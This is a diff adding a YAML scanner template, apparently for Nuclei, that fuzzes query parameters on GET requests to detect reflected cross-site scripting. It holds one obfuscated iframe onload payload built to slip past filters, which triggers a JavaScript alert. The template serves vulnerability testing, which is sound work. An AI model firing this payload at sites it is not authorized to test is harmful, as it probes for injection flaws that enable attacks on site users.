@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-iframe
+
+info:
+  name: Custom XSS Detection with Iframe Payload
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using an iframe payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss:
+        - "<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert``\"';>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
